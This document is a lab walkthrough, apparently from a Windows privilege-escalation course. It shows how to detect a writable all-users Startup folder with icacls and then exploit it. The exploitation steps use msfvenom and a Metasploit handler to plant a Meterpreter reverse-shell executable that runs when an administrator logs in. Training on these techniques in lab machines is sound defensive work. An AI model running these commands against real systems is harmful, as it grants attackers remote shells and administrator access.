#Windows #PrivEsc #StartUp #MSFvenom  #msfconsole #meterpreter #metasploit 

[icacls Documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)

## **Detection**  

Windows VM

1. Open command prompt and type: `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`  
2. From the output notice that the “`BUILTIN\Users`” group has full access ‘(F)’ to the directory.

## **Exploitation**

Kali VM

1. Open command prompt and type: `msfconsole`  
2. In Metasploit (msf > prompt) type: `use multi/handler`  
3. In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp`  
4. In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`  
5. In Metasploit (msf > prompt) type: `run`  
6. Open another command prompt and type: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe` 
7. Copy the generated file, `x.exe`, to the Windows VM.

Windows VM

1. Place `x.exe` in “`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`"
2. Logoff.  
3. Login with the administrator account credentials.

Kali VM

1. Wait for a session to be created, it may take a few seconds.  
2. In Meterpreter(meterpreter > prompt) type: `getuid`  
3. From the output, notice the user is “`TCM-PC\TCM`"  